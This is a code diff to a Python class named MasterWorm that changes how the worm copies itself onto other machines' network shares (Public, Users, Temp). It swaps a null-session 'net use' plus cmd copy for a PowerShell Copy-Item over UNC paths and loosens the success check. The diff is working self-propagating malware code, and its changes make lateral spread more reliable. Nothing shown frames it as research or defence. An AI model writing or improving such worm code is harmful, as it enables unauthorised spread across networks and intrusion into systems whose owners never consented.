@@ -226,32 +226,28 @@ class MasterWorm:
             worm_path = os.path.abspath(__file__)
             
             # Try common user-accessible shares (using actual share names)
+            # Use forward slashes - Windows accepts them for UNC paths too
             accessible_shares = [
-                f'\\\\{target_ip}\\Public',  # Shared Public folder
-                f'\\\\{target_ip}\\Users',   # Shared Users folder
-                f'\\\\{target_ip}\\Temp',    # Shared Temp folder
+                f'//{target_ip}/Public',  # Shared Public folder
+                f'//{target_ip}/Users',   # Shared Users folder
+                f'//{target_ip}/Temp',    # Shared Temp folder
             ]
             
             for share in accessible_shares:
                 try:
-                    remote_path = f'{share}\\worm.py'
+                    remote_path = f'{share}/worm.py'
                     logger.info(f'[COPY] Trying {remote_path}')
                     
-                    # Try to connect with null session (guest access)
-                    subprocess.run(
-                        ['net', 'use', share, '/user:'],
-                        capture_output=True,
-                        timeout=5
-                    )
-                    
+                    # Use PowerShell to copy via UNC path (more reliable)
+                    ps_cmd = f'Copy-Item -Path "{worm_path}" -Destination "{remote_path}" -Force'
                     result = subprocess.run(
-                        ['cmd', '/c', f'copy "{worm_path}" "{remote_path}"'],
+                        ['powershell', '-NoProfile', '-Command', ps_cmd],
                         capture_output=True,
                         text=True,
                         timeout=10
                     )
                     
-                    if result.returncode == 0 and 'copied' in result.stdout.lower():
+                    if result.returncode == 0:
                         logger.info(f'[COPY] ✓ Worm copied via {share}')
                         return True
                     else:
